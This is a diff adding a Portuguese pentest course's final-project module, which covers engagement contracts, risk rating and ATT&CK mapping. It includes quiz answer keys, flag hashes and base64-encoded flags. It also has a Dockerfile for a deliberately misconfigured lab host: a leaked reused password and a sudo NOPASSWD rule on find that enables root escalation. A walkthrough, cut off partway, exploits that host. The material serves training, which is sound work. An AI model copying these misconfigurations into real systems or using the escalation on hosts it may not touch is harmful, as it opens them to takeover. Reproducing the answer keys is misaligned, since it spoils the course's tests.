@@ -1,0 +1,646 @@
+---
+slug: projeto-final
+track: trilha-8
+title: "Projeto final: pentest completo + relatório"
+prerequisites: [metodologia-completa, ctf-guiado, ctf-sem-dicas, relatorio-de-pentest]
+lab: null
+tasks:
+  - slug: flag-foothold
+    title: "Flag 1 — acesso inicial (foothold)"
+    type: flag
+    prompt: "Conduza o recon, explore a má configuração da web, use o que vazar para entrar por SSH como webadmin e leia /home/webadmin/user.txt. Cole no formato FLAG{...}."
+    hint: "O nmap te deu duas portas. A web tem uma listagem de diretório que não devia estar ligada — o que um backup esquecido ali costuma vazar? Reaproveite o que achar na porta ao lado."
+    flag:
+      hash: "scrypt$16384$8$1$6d56a8160f76ebf1ae289936e56bf1ff533c9b957a8e14733cb4716bcdcf49e3"
+      salt: "6221fb7c8ecb144b72fafb07def22ad0"
+  - slug: flag-crown-jewel
+    title: "Flag 2 — joia da coroa (root)"
+    type: flag
+    prompt: "A partir de webadmin, escale a root e leia a joia da coroa em /root/crown.txt. Cole no formato FLAG{...}."
+    hint: "Logado como webadmin, não pense em exploit: pergunte o que esta conta pode rodar como root sem senha. Um comando de busca comum, liberado no sudo, é tudo que o GTFOBins precisa."
+    flag:
+      hash: "scrypt$16384$8$1$9d62f701add48225e60ee48fad4cb8fddaefe209a4088e7a02c7cc4bc2fed572"
+      salt: "9de7c6ae841f04da15a9ff47947b454f"
+  - slug: flag-relatorio
+    title: "Flag 3 — o relatório (mapear os achados)"
+    type: flag
+    prompt: "Monte report-findings.txt com o ID MITRE ATT&CK de cada um dos 3 achados (F1, F2, F3, nessa ordem) e rode report-check.cjs. A flag só sai se o mapeamento inteiro estiver certo. Cole no formato FLAG{...}."
+    hint: "São 3 achados: credencial num arquivo exposto, conta válida reusada e regra sudo perigosa. Cada um tem UMA técnica no attack.mitre.org. A ordem do arquivo é F1 depois F2 depois F3."
+    flag:
+      hash: "scrypt$16384$8$1$2f12932b40a189780e2cf4eb816cbee754bd56f4d5eeb38fce7bc34ac40a6a34"
+      salt: "7b54ab049546fa4fb5dbb60412bffa97"
+  - slug: quiz-final
+    title: "Quiz — Projeto final: pentest completo + relatório"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Este é o módulo de fechamento do curso. Qual frase melhor descreve o que um pentest entrega?"
+        options:
+          - "A invasão em si: provar que dá para entrar já é o produto"
+          - "A maior quantidade possível de flags e de hosts comprometidos"
+          - "Um relatório reproduzível, com achados priorizados por risco e recomendações de correção — a invasão é o meio, não o fim"
+          - "Uma lista de todas as ferramentas que o testador usou"
+        answer: 2
+        explanation: "O cliente compra uma decisão: o que corrigir primeiro e como. Isso é o relatório. A invasão é o meio que produz as evidências; contar hosts ou ferramentas não é entregável. Um teste que compromete tudo mas não entrega recomendações acionáveis falhou no que importa."
+      - question: "Antes de tocar em qualquer alvo, o que o pré-engajamento precisa ter fechado?"
+        options:
+          - "Escopo, autorização por escrito, regras de engajamento e a janela de teste"
+          - "O exploit que você vai usar e a wordlist do fuzzing"
+          - "O nome da ferramenta de relatório e o logotipo da capa"
+          - "Nada: num teste black-box você começa atacando e documenta depois"
+        answer: 0
+        explanation: "O que torna o teste legal e seguro é o contrato: escopo (o que pode ser tocado), autorização por escrito, regras de engajamento (o que é permitido) e a janela. Sem isso, a mesma ação vira crime (Lei 12.737/2012). Escolher exploit ou capa é detalhe de execução, não autorização, e black-box não dispensa o contrato."
+      - question: "Você achou a regra sudo NOPASSWD para o find, que leva a root. Como se chega à severidade do achado?"
+        options:
+          - "Pela ferramenta usada: quanto mais avançada, maior a severidade"
+          - "Pela ordem em que você encontrou o achado durante o teste"
+          - "Sempre crítica: todo achado de um pentest é crítico por definição"
+          - "Pela probabilidade de ser explorado vezes o impacto se for — aqui, alta × alto = crítica"
+        answer: 3
+        explanation: "Risco (risk rating) é probabilidade × impacto. Qualquer usuário local explora a regra (probabilidade alta) e o resultado é controle total do host (impacto alto): severidade crítica. A ferramenta, a ordem de descoberta e um 'tudo é crítico' não classificam risco — e inflar tudo para crítico destrói a priorização que o cliente precisa."
+      - question: "Uma recomendação de correção ataca a causa-raiz quando ela…"
+        options:
+          - "manda trocar o binário find por outro comando no sudoers"
+          - "remove a regra NOPASSWD e aplica o menor privilégio, matando a classe inteira do problema"
+          - "sugere reiniciar o servidor periodicamente"
+          - "pede para esconder melhor a regra do sudo"
+        answer: 1
+        explanation: "Trocar find por outro binário só move o problema: muitos comandos viram shell (veja o GTFOBins). A causa-raiz é a regra permissiva em si; removê-la e dar o menor privilégio elimina a classe toda. Reiniciar ou esconder não corrige nada — são sintomas tratados, não a doença."
+      - question: "Por que mapear cada achado a uma técnica do MITRE ATT&CK (ex.: T1548.003) é parte do valor do relatório?"
+        options:
+          - "Porque o cliente paga por quantidade de siglas"
+          - "Porque o mapeamento executa a correção automaticamente"
+          - "Porque o ID liga o achado a detecções e mitigações já catalogadas, dando ao defensor uma narrativa reproduzível e acionável"
+          - "Porque sem o ID a flag do laboratório não aparece"
+        answer: 2
+        explanation: "Cada técnica do ATT&CK vem com detecções e mitigações públicas: o ID transforma 'a gente entrou' numa história que o blue team pode caçar e cortar. Não é volume de siglas, não corrige nada sozinho, e a flag é consequência do mapeamento certo, não o motivo dele."
+      - question: "Durante a pós-exploração de um host, por que NÃO instalar persistência e varrer tudo o que estiver ao alcance?"
+        options:
+          - "Porque o escopo e as regras de engajamento limitam o que é autorizado, e ruído/alterações desnecessárias fogem do propósito e podem quebrar a produção"
+          - "Porque persistência é impossível em Linux"
+          - "Porque isso tornaria o relatório longo demais"
+          - "Porque root já encerra o teste automaticamente"
+        answer: 0
+        explanation: "O teste serve ao objetivo do cliente dentro do escopo, com OPSEC: alterações e barulho desnecessários saem do contrato e arriscam a produção. Persistência é perfeitamente possível, o tamanho do relatório não é o critério, e root num host é um meio — o próximo passo sai de nova enumeração orientada às joias da coroa, não do fim do teste."
+      - question: "Por que anotar comando, saída e horário ENQUANTO ataca, em vez de reconstruir de memória no fim?"
+        options:
+          - "Porque a plataforma exige um log para validar a flag"
+          - "Porque anotar deixa o ataque mais rápido"
+          - "Porque sem anotar o exploit não funciona"
+          - "Porque o relatório precisa de evidência reproduzível e cadeia de custódia, e a memória perde o comando exato, a saída e a ordem dos saltos"
+        answer: 3
+        explanation: "O entregável é um relatório que o cliente pode reproduzir e auditar; isso exige evidência com cadeia de custódia, capturada no momento. De memória você perde o comando exato, a saída e a cronologia. Não é requisito da plataforma, não acelera o ataque, e o exploit funciona anotando ou não — o que muda é você ter, ou não, o trabalho."
+      - question: "No fim do engajamento vem o debrief (read-out) com o cliente. Para que serve, além de 'entregar o PDF'?"
+        options:
+          - "Para o testador se gabar das técnicas que usou"
+          - "Para apresentar os achados priorizados a quem decide, alinhar o entendimento do risco e combinar o plano e o retest das correções"
+          - "Para negociar o preço do próximo contrato durante a reunião"
+          - "Para entregar as senhas em claro que foram encontradas, por e-mail"
+        answer: 1
+        explanation: "O debrief traduz o relatório para quem decide: prioriza, alinha o risco e combina correção e retest. Não é vitrine de técnicas nem balcão de vendas, e segredos encontrados nunca circulam em claro — vão tratados, pela via combinada nas regras de engajamento."
+glossary:
+  - term: risk rating
+    definition: "A classificação de risco de um achado, obtida cruzando a probabilidade de ele ser explorado com o impacto caso seja (probabilidade × impacto). É o que produz a severidade e permite priorizar o que corrigir primeiro, em vez de tratar tudo como igual."
+  - term: root cause
+    definition: "A causa-raiz de um achado: a condição que, se corrigida, elimina a classe inteira do problema, e não só o sintoma visível. Uma recomendação que ataca a causa-raiz vale muito mais que um remendo pontual."
+  - term: debrief
+    definition: "A reunião de fechamento (read-out) de um engajamento, em que o time apresenta os achados priorizados a quem decide, alinha o entendimento do risco e combina o plano de correção e o retest."
+---
+
+import funil from "./img/funil-do-engajamento.svg";
+import esteira from "./img/da-evidencia-a-recomendacao.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Você chegou ao fim do curso. Nas Trilhas 2 a 7 você aprendeu as peças — <GlossaryTerm term="reconnaissance">recon</GlossaryTerm> com nmap, exploração web, quebra de hash, escalação de privilégio, Active Directory. No 8.1 você as alinhou numa <GlossaryTerm term="PTES">metodologia</GlossaryTerm> única. No 8.2 e no 8.3 você resolveu máquinas estilo <GlossaryTerm term="boot2root">boot2root</GlossaryTerm>, com dicas e sem. No 8.4 você aprendeu a estrutura do relatório. Este módulo junta **tudo numa coisa só**: um engajamento completo, do contrato à entrega.
+
+E aqui mora a virada que separa um entusiasta de CTF de um profissional. Resolver uma máquina termina na flag — "eu entrei". Um pentest **não** termina aí: ele é um trabalho **contratado**, com começo, meio e fim definidos, e o que o cliente compra não é a invasão, é o **relatório**. A invasão é só o meio que produz as evidências. Quem internaliza isso para de caçar flags e passa a entregar valor: achados priorizados por risco e recomendações que o cliente consegue executar.
+
+No mundo real, é exatamente essa diferença que decide o tamanho de um desastre. Em 2019, a Capital One perdeu os dados de cerca de 106 milhões de pessoas por uma sequência de **más configurações** — não um exploit exótico (seção 4). Cada elo daquela cadeia era um achado que um teste teria classificado por risco e recomendado corrigir. O engajamento que você vai conduzir aqui, num ambiente isolado seu, é o mesmo arco daquele incidente — e termina onde o trabalho de verdade termina: num relatório.
+
+**Ao final, você vai saber:**
+
+- conduzir um engajamento **de ponta a ponta**: pré-engajamento (escopo, autorização, <GlossaryTerm term="rules of engagement">regras de engajamento</GlossaryTerm>, preflight) → recon → <GlossaryTerm term="foothold">foothold</GlossaryTerm> → escalação → <GlossaryTerm term="post-exploitation">pós-exploração</GlossaryTerm> enxuta → relatório;
+- transformar cada passo do ataque em uma **linha de achado**, com evidência, <GlossaryTerm term="risk rating">classificação de risco</GlossaryTerm>, técnica <GlossaryTerm term="MITRE ATT&CK">MITRE ATT&CK</GlossaryTerm> e uma recomendação que ataca a <GlossaryTerm term="root cause">causa-raiz</GlossaryTerm>;
+- classificar a <GlossaryTerm term="severity">severidade</GlossaryTerm> de um achado por probabilidade × impacto, em vez de inflar tudo para "crítico";
+- registrar <GlossaryTerm term="evidence">evidências</GlossaryTerm> com <GlossaryTerm term="chain of custody">cadeia de custódia</GlossaryTerm> enquanto ataca, e fechar com um <GlossaryTerm term="debrief">debrief</GlossaryTerm> e um plano de <GlossaryTerm term="retest">retest</GlossaryTerm>;
+- explicar por que o contorno — escopo, autorização, <GlossaryTerm term="OPSEC">OPSEC</GlossaryTerm> e limpeza — é o que separa o pentest profissional do crime.
+
+**Pré-requisitos:** 8.1 (a espinha da metodologia), 8.2 e 8.3 (as máquinas boot2root, com e sem dicas) e 8.4 (a estrutura do relatório). Este módulo **usa** tudo isso junto; se alguma dessas peças ainda estiver frouxa, volte a ela. Você também vai reaproveitar nmap (2.4), content discovery (2.8), <GlossaryTerm term="sudo">sudo</GlossaryTerm>/<GlossaryTerm term="SUID">SUID</GlossaryTerm>/capabilities da Trilha 6 e a disciplina de anotação do 1.5.
+
+**Tempo estimado:** 4 a 6 horas, incluindo o relatório — a parte que mais leva tempo, de propósito.
+
+<Callout variant="ethics">
+Tudo o que você fizer aqui só é legítimo porque o alvo é **seu**: um contêiner descartável que você monta no seu WSL, publicado **apenas em `127.0.0.1`** (a mesma regra de isolamento dos alvos oficiais da plataforma) e **sem nenhuma vulnerabilidade escrita sob medida** — só más configurações de software padrão. A mesma sequência contra um sistema que não é seu, sem <GlossaryTerm term="scope">escopo</GlossaryTerm> e **autorização por escrito** (Trilha 1), é crime no Brasil: acesso não autorizado a dispositivo informático, Lei 12.737/2012. O pré-engajamento deste módulo não é burocracia — é o que mantém o seu trabalho dentro da lei.
+</Callout>
+
+## 2. Teoria aprofundada — o engajamento por dentro
+
+### 2.1 Um pentest é um contrato, não uma invasão
+
+A diferença mais importante entre o que você fez no 8.3 e o que vai fazer agora não é técnica — é **contratual**. Uma máquina de CTF existe para ser quebrada; um sistema de cliente existe para **funcionar**, e você só pode tocá-lo dentro de limites combinados por escrito. Esses limites têm nomes:
+
+- O <GlossaryTerm term="scope">escopo</GlossaryTerm> (scope) diz **o que** pode ser testado: quais IPs, domínios, aplicações. Fora dele, você não entra — mesmo que dê.
+- A autorização por escrito é a permissão legal. É o documento que transforma "acesso não autorizado" (crime) em "teste autorizado" (trabalho). Sem ele, você é um invasor.
+- As <GlossaryTerm term="rules of engagement">regras de engajamento</GlossaryTerm> (rules of engagement, ROE) dizem **como**: pode fazer brute force? pode derrubar um serviço para provar um DoS? em que janela de horário? quem avisar se achar algo crítico? Tudo combinado antes.
+- O <GlossaryTerm term="statement of work">statement of work</GlossaryTerm> amarra prazo, entregáveis e objetivo (as <GlossaryTerm term="crown jewels">joias da coroa</GlossaryTerm> que o cliente quer proteger).
+
+Nada é tocado antes disso. O **preflight** — como o que você viu no 1.3 — é o último passo de segurança: conferir, programaticamente, que cada alvo que você vai atacar está de fato dentro do escopo, para nunca mirar o IP errado por um dedo trocado.
+
+### 2.2 O funil: tudo desemboca no relatório
+
+O engajamento tem três estágios, e eles formam um funil que termina sempre no mesmo lugar.
+
+<Figure
+  src={funil}
+  alt="Fluxo em três estágios: pré-engajamento (escopo, autorização, regras de engajamento, janela, preflight), execução como um laço (recon, foothold, escalação, pós-exploração) envolto por OPSEC e notas ao vivo, e entrega (o relatório com resumo executivo, achados com risco e ATT&CK, narrativa e recomendações). Uma seta grossa mostra tudo desembocando no relatório."
+  caption="O funil do engajamento: o pré-engajamento autoriza, a execução gira o laço da metodologia e tudo desemboca no relatório — o único entregável que o cliente compra."
+/>
+
+Repare na faixa que envolve a execução: **OPSEC e notas ao vivo**. Diferente do CTF, aqui você não pode fazer todo o barulho do mundo (pode haver produção do outro lado) e não pode reconstruir o caminho de memória no fim. Cada comando, cada saída e cada horário viram <GlossaryTerm term="evidence">evidência</GlossaryTerm> no momento em que acontecem — com <GlossaryTerm term="chain of custody">cadeia de custódia</GlossaryTerm>, para que o relatório seja **reproduzível** e auditável. É a disciplina do 1.5, agora sob pressão de um teste real.
+
+### 2.3 De um passo do ataque a uma linha de achado
+
+O relatório não é um diário do que você fez; é uma lista de **achados** (<GlossaryTerm term="finding">findings</GlossaryTerm>), cada um transformando um passo técnico em algo que o cliente pode decidir. Todo achado passa pela mesma esteira:
+
+<Figure
+  src={esteira}
+  alt="Esteira de cinco caixas usando o achado real do lab: evidência (sudo -l mostra NOPASSWD para find; sudo find -exec /bin/sh leva a uid=0), achado (regra sudo permissiva, id PF-03), risco (probabilidade alta porque qualquer usuário local explora, impacto alto porque dá controle do host, severidade crítica), técnica (MITRE ATT&CK T1548.003 Sudo and Sudo Caching) e recomendação (remover a regra NOPASSWD e aplicar menor privilégio — a causa-raiz)."
+  caption="Todo achado nasce desta esteira: evidência → achado → risco → técnica ATT&CK → recomendação de causa-raiz. Pular um elo enfraquece o relatório inteiro."
+/>
+
+Dois elos merecem atenção, porque são onde relatórios ruins falham:
+
+**O risco (<GlossaryTerm term="risk rating">risk rating</GlossaryTerm>).** A severidade de um achado não é "o quanto pareceu grave"; é **probabilidade × impacto**. Probabilidade: quão fácil e provável é alguém explorar? Impacto: o que acontece se explorar? Uma regra sudo que qualquer usuário local vira em root tem probabilidade alta e impacto alto → **crítica**. Já um bug que exige condições raríssimas e vaza um dado público tem probabilidade baixa e impacto baixo → informativo. O erro clássico do iniciante é marcar tudo como crítico; isso destrói a priorização, que é justamente o que o cliente precisa. (O <GlossaryTerm term="CVSS">CVSS</GlossaryTerm>, do 1.1, é uma fórmula padronizada para chegar a esse número de forma defensável.)
+
+**A recomendação (<GlossaryTerm term="root cause">causa-raiz</GlossaryTerm>).** A <GlossaryTerm term="remediation">remediação</GlossaryTerm> boa não trata o sintoma, trata a causa-raiz. "Troque o `find` por outro comando no sudoers" é remendo — dezenas de binários viram shell (o <GlossaryTerm term="GTFOBins">GTFOBins</GlossaryTerm>). A recomendação de causa-raiz é "remova a regra NOPASSWD e aplique o <GlossaryTerm term="least privilege">menor privilégio</GlossaryTerm>": isso mata a classe inteira do problema. Uma recomendação que o cliente aplica e, no <GlossaryTerm term="retest">retest</GlossaryTerm>, fecha a classe toda — esse é o valor do relatório.
+
+### 2.4 A defesa espelhada
+
+Como todo módulo, a visão aqui é completa: o mesmo relatório que denuncia a cadeia é o que ensina a cortá-la. Pense como o <GlossaryTerm term="blue team">blue team</GlossaryTerm>: o atacante precisa de **todos** os elos (listagem de diretório ligada → segredo no arquivo → credencial reusada → regra sudo perigosa); o defensor só precisa quebrar **um**. Por isso o relatório prioriza — ele diz qual elo, cortado primeiro, dá o maior retorno. E por isso a métrica do defensor é o <GlossaryTerm term="dwell time">dwell time</GlossaryTerm> (8.1): quanto antes a cadeia for detectada, menor o estrago.
+
+## 3. Na prática da segurança — como se conduz o dia a dia
+
+Este é um módulo de consolidação, então esta seção não ensina um ataque novo: mostra **como um profissional opera** um engajamento e onde o hábito de CTF precisa ser desaprendido.
+
+### 3.1 O relógio é contratado
+
+No CTF, o tempo é o seu fim de semana. Num engajamento, ele é **contratado**: há uma janela, e dentro dela você precisa cobrir o escopo e ainda sobrar tempo para escrever. Profissionais reservam, como regra de bolso, perto de **metade** do tempo para documentação e relatório — não é exagero, é onde o valor é entregue. O <GlossaryTerm term="time-boxing">time-boxing</GlossaryTerm> do 8.3 deixa de ser conselho e vira gestão de contrato: um <GlossaryTerm term="rabbit hole">rabbit hole</GlossaryTerm> que consome uma tarde é tempo que faltará no relatório.
+
+### 3.2 Notas que viram relatório
+
+A anotação ao vivo não é um diário solto; ela já nasce na forma do relatório. Para cada passo que vira achado, registre no momento: **o quê** (o comando), **o resultado** (a saída, colada, não parafraseada), **quando** (horário, de preferência em UTC) e **onde** (o alvo). Essa é a matéria-prima da esteira da seção 2.3 — e é a <GlossaryTerm term="chain of custody">cadeia de custódia</GlossaryTerm> que faz o achado ser reproduzível. Um <GlossaryTerm term="writeup">writeup</GlossaryTerm> bem feito durante o teste praticamente se transforma em relatório.
+
+### 3.3 Comunicação fora do relatório
+
+Nem tudo espera o PDF. As regras de engajamento definem gatilhos de **comunicação imediata**: achou uma falha crítica exposta à internet, uma base de dados de clientes aberta, indício de que a máquina **já** estava comprometida por um terceiro? Isso não vai para o fim do relatório — vai para o telefone do contato combinado, agora. Saber a diferença entre "anoto e sigo" e "paro e aviso" é maturidade profissional.
+
+### 3.4 O fechamento: debrief e retest
+
+O engajamento termina com um <GlossaryTerm term="debrief">debrief</GlossaryTerm> (read-out): uma reunião em que você apresenta os achados priorizados a quem decide — frequentemente gente não técnica. É onde o <GlossaryTerm term="executive summary">resumo executivo</GlossaryTerm> prova seu valor: traduzir risco técnico em risco de negócio. E combina-se o <GlossaryTerm term="retest">retest</GlossaryTerm>: depois que o cliente corrige, você volta para confirmar que a correção pegou — fechando o ciclo que começou no pré-engajamento.
+
+## 4. Casos reais — a cadeia de más configurações
+
+### Capital One (2019) — uma cadeia de configuração, não um exploit
+
+Em **29 de julho de 2019**, a Capital One anunciou que dados de cerca de **106 milhões** de pessoas (aproximadamente 100 milhões nos EUA e 6 milhões no Canadá) haviam sido acessados por uma pessoa de fora. Entre o que vazou: cerca de **140 mil** números de seguro social (SSN) e cerca de **80 mil** números de conta bancária vinculados; a empresa afirmou que números de cartão e credenciais de login **não** foram acessados.
+
+O que torna este o caso perfeito para o seu projeto final é **como** aconteceu: não foi um dia-zero exótico, foi uma **cadeia de más configurações**, exatamente como a do seu laboratório. A invasora — Paige Thompson, ex-funcionária do provedor de nuvem — explorou um **web application firewall mal configurado** para fazer o servidor buscar credenciais no serviço interno de metadados da nuvem (uma falha da família <GlossaryTerm term="SSRF">SSRF</GlossaryTerm>, Server-Side Request Forgery, que você viu no 4.7); com essas credenciais, de um papel com permissão excessiva, ela listou e copiou os dados guardados no armazenamento em nuvem — as joias da coroa. Cada elo tem um nome de achado: firewall mal configurado, credencial obtida por SSRF, papel com privilégio excessivo. O Departamento de Justiça dos EUA a **condenou em 17 de junho de 2022** por sete crimes federais (fraude eletrônica e acessos não autorizados), e estimou o dano em mais de 250 milhões de dólares.
+
+- **Impacto:** ~106 milhões de pessoas; ~140 mil SSNs e ~80 mil contas bancárias; multa regulatória de 80 milhões de dólares ao banco e acordo civil de 190 milhões.
+- **Lição:** o desastre raramente é um exploit genial; é uma **cadeia de configurações** que ninguém classificou por risco nem corrigiu. Um pentest existe justamente para achar e priorizar esses elos **antes** do atacante — cada um é um achado com causa-raiz corrigível.
+- **Fontes:** anúncio da própria [Capital One (jul. 2019)](https://www.aljazeera.com/economy/2019/7/30/capital-one-says-106-million-peoples-information-hacked) corroborado pelo [formulário 10-Q da Capital One na SEC (2º tri. 2019)](https://www.sec.gov/Archives/edgar/data/927628/000092762819000274/cof-06302019x10q.htm) e pela condenação no [U.S. Department of Justice (jun. 2022)](https://www.justice.gov/usao-wdwa/pr/former-seattle-tech-worker-convicted-wire-fraud-and-computer-intrusions).
+
+<Callout variant="info" title="Uma segunda lição, da Equifax (2017)">
+No 8.1 você viu a Equifax pelo ângulo do **dwell time** (76 dias escondido). Há um segundo ângulo que fecha este módulo: o conserto **já era conhecido**. A falha do Apache Struts ([CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638)) tinha patch em 7 de março de 2017 e houve alerta do US-CERT para aplicá-lo; a recomendação existia, mas não foi executada. É a prova de que **um achado que ninguém aplica não vale nada** — o valor do relatório é a ação que ele provoca. Fonte: [GAO-18-559 (ago. 2018)](https://www.gao.gov/products/gao-18-559).
+</Callout>
+
+## 5. Mãos à obra — o engajamento completo
+
+Este módulo **não tem lab na plataforma** (`lab: null`): um ambiente de engajamento é um host **mal configurado de propósito**, e a plataforma só orquestra alvos consagrados. Então você monta, no seu WSL, um contêiner descartável que simula um host de empresa — "ACME" — e o ataca **de fora**, a partir do seu terminal, como um engajamento externo de verdade. É o único módulo do curso em que você percorre recon → foothold → escalação → relatório num fluxo contínuo.
+
+<Callout variant="info" title="Por que publicado só em 127.0.0.1">
+Diferente das máquinas sem rede do 6.x e 8.3, aqui você precisa de um caminho de rede do atacante (seu WSL) ao alvo — senão não há recon externo. A solução segura é publicar as portas do contêiner **apenas no loopback** (`127.0.0.1`), exatamente a regra de isolamento dos alvos oficiais da plataforma: nada fica acessível a outros aparelhos da rede. O contêiner sobe com `--rm` (some ao sair), sem exploit sob medida, e o `uid 0` de dentro dele **não** é o root do seu WSL (namespaces, releia o 6.1).
+</Callout>
+
+**Objetivo:** ao terminar você terá, num engajamento próprio e autorizado, (1) feito o recon e explorado a web para conseguir o **foothold** por SSH — a **Flag 1**; (2) escalado a **root** e lido a joia da coroa — a **Flag 2**; e (3) montado o **relatório** mapeando os três achados ao MITRE ATT&CK — a **Flag 3**, que só sai se o relatório estiver certo. Três flags, três entregas de um pentest.
+
+### 5.1 Pré-engajamento (não pule)
+
+Antes de atacar, finja que recebeu uma autorização. O "escopo" deste engajamento é um único host, a aplicação ACME, que você vai subir em `127.0.0.1`. As regras: pode atacar as portas publicadas; **não** destrua dados; registre tudo. Crie a bancada e o arquivo de escopo:
+
+```console
+$ mkdir -p ~/engajamento-acme && cd ~/engajamento-acme
+$ printf '%s\n' 'target=127.0.0.1' 'ports=2222,8080' 'regra=nao destruir dados; registrar tudo' > scope.txt
+$ echo "[$(date -u +%FT%TZ)] engajamento iniciado" > notes.md
+```
+
+Agora monte o alvo. Crie os três arquivos abaixo. O `Dockerfile` é a receita do host ACME (só más configurações de software padrão: listagem de diretório ligada, um segredo esquecido num backup, uma senha reusada e uma regra de sudo perigosa). As duas flags nascem em **base64** dentro dele, para não aparecerem em claro no módulo — mas, ao montar, cada arquivo nasce com a flag **certa**, a que a plataforma valida.
+
+<CodeBlock
+  title="~/engajamento-acme/Dockerfile"
+  lang="text"
+  code={`FROM debian:trixie-slim
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt-get update \\
+ && apt-get install -y --no-install-recommends \\
+    openssh-server nginx sudo procps iproute2 findutils coreutils grep passwd login curl ca-certificates \\
+ && rm -rf /var/lib/apt/lists/*
+
+# Low-privilege service account: the foothold identity.
+RUN useradd --create-home --shell /bin/bash --uid 1001 webadmin \\
+ && echo 'webadmin:Acme-Web-2019!' | chpasswd
+
+# Misconfig 1: nginx with directory listing (autoindex) ON, exposing /backup.
+RUN mkdir -p /var/www/html/backup \\
+ && printf '%s\\n' '<h1>ACME Transfer Portal</h1><p>Internal use only.</p>' > /var/www/html/index.html
+# Misconfig 2: a forgotten deploy backup leaking the SSH password (credential reuse).
+RUN printf '%s\\n' \\
+  '# deploy.conf.bak  (ops backup - DO NOT SHIP)' \\
+  'SITE_ENV=production' \\
+  'DEPLOY_USER=webadmin' \\
+  'DEPLOY_PASS=Acme-Web-2019!   # reused as the shell login, rotate me' \\
+  > /var/www/html/backup/deploy.conf.bak \\
+ && chmod -R a+rX /var/www/html
+COPY nginx-site.conf /etc/nginx/sites-available/default
+
+# Misconfig 3: sudo NOPASSWD on a GTFOBins-exploitable standard binary.
+RUN printf '%s\\n' 'webadmin ALL=(root) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/webadmin \\
+ && chmod 440 /etc/sudoers.d/webadmin
+
+# Flag 1 (foothold): readable by webadmin. (base64, so not in clear text)
+RUN { echo 'RkxBR3tmb290aG9sZC1hdXRvaW5kZXgtYmFja3VwLWxlYWt9' | base64 -d; echo; } > /home/webadmin/user.txt \\
+ && chown webadmin:webadmin /home/webadmin/user.txt && chmod 600 /home/webadmin/user.txt
+# Flag 2 (crown jewel): readable only as root; with some fake customer PII it protects.
+RUN { echo 'RkxBR3tjcm93bi1qZXdlbC1zdWRvLWZpbmQtdG8tcm9vdH0=' | base64 -d; echo; } > /root/crown.txt && chmod 600 /root/crown.txt \\
+ && printf '%s\\n' 'id,name,ssn_last4,balance' '1,A. Cliente,4412,10523.40' '2,B. Cliente,9087,221.00' > /root/customers.csv \\
+ && chmod 600 /root/customers.csv
+
+RUN mkdir -p /run/sshd
+COPY entrypoint.sh /usr/local/sbin/entrypoint.sh
+RUN chmod 755 /usr/local/sbin/entrypoint.sh
+EXPOSE 22 80
+ENTRYPOINT ["/usr/local/sbin/entrypoint.sh"]`}
+/>
+
+<CodeBlock
+  title="~/engajamento-acme/nginx-site.conf"
+  lang="text"
+  code={`server {
+    listen 80 default_server;
+    root /var/www/html;
+    index index.html;
+    autoindex on;          # MISCONFIG: directory listing enabled
+    location / { try_files $uri $uri/ =404; }
+}`}
+/>
+
+<CodeBlock
+  title="~/engajamento-acme/entrypoint.sh"
+  lang="bash"
+  code={`#!/bin/sh
+ssh-keygen -A >/dev/null 2>&1
+service nginx start >/dev/null 2>&1
+exec /usr/sbin/sshd -D -e`}
+/>
+
+Construa (usa a internet da sua máquina, uma vez) e suba o host com as portas **só no loopback**:
+
+```console
+$ cd ~/engajamento-acme
+$ docker build -t acme:local .
+$ docker run -d --rm --name acme --hostname acme-web \
+    -p 127.0.0.1:2222:22 -p 127.0.0.1:8080:80 acme:local
+$ docker port acme
+22/tcp -> 127.0.0.1:2222
+80/tcp -> 127.0.0.1:8080
+```
+
+### 5.2 Recon (guiado)
+
+Comece como todo engajamento: o que está exposto? Faça o <GlossaryTerm term="enumeration">enumeration</GlossaryTerm> das portas publicadas. A ferramenta é o nmap (2.4); se não estiver no seu WSL, instale com `sudo apt install -y nmap`, ou use o `curl`/`ss` que você já tem.
+
+```console
+$ nmap -sV -p 2222,8080 127.0.0.1
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+8080/tcp open  http    nginx
+```
+
+Dois serviços: SSH e um servidor web nginx. Olhe a web primeiro — é a superfície mais rica:
+
+```console
+$ curl -s -i http://127.0.0.1:8080/ | head -n 6
+HTTP/1.1 200 OK
+Server: nginx
+Content-Type: text/html
+Content-Length: 55
+```
+
+Uma página institucional. Agora o reflexo do 2.8 (content discovery): o que mais o servidor expõe? Anote cada passo no `notes.md` — isso é a cadeia de custódia nascendo.
+
+### 5.3 Desafio — do recon ao foothold (Flag 1)
+
+**Objetivo:** conseguir o foothold por SSH como `webadmin` e ler `/home/webadmin/user.txt`. O caminho começa num erro de configuração muito comum do servidor web, que expõe um arquivo que não devia estar ali. Siga o fio: o que o arquivo entrega leva direto à porta ao lado.
+
+<Hint title="Dica 1 — a web">
+O nginx deste host está com a listagem de diretório ligada (uma má configuração clássica, `autoindex on`). Procure diretórios "óbvios" de um deploy: `/backup/`, `/.git/`, `/old/`. Um `curl http://127.0.0.1:8080/backup/` vai te mostrar o que há ali.
+</Hint>
+
+<Hint title="Dica 2 — o que vazou">
+O backup é um arquivo de configuração de deploy. Ele traz um usuário e uma senha — e um comentário confessando que a senha é **reaproveitada** no login do shell. Essa é a família de achado "credencial em arquivo". A porta 2222 é SSH. Junte as pontas.
+</Hint>
+
+<Solution title="Solução — confira só depois de tentar">
+A listagem de diretório expõe o `/backup/`, e dentro dele um backup de configuração legível por qualquer um:
+
+```console
+$ curl -s http://127.0.0.1:8080/backup/
+<html><head><title>Index of /backup/</title></head><body>
+<h1>Index of /backup/</h1><hr><pre><a href="../">../</a>
+<a href="deploy.conf.bak">deploy.conf.bak</a>          19-Oct-2026 05:03   157
+</pre><hr></body></html>
+
+$ curl -s http://127.0.0.1:8080/backup/deploy.conf.bak
+# deploy.conf.bak  (ops backup - DO NOT SHIP)
+SITE_ENV=production
+DEPLOY_USER=webadmin
+DEPLOY_PASS=Acme-Web-2019!   # reused as the shell login, rotate me
+```
+
+Uma credencial num arquivo exposto (achado **F1**), reaproveitada no login (achado **F2**). Entre por SSH — o `webadmin` no host ACME, pela porta 2222:
+
+```console
+$ ssh -p 2222 webadmin@127.0.0.1
+webadmin@127.0.0.1's password:        # digite Acme-Web-2019! (não aparece na tela)
+webadmin@acme-web:~$ id
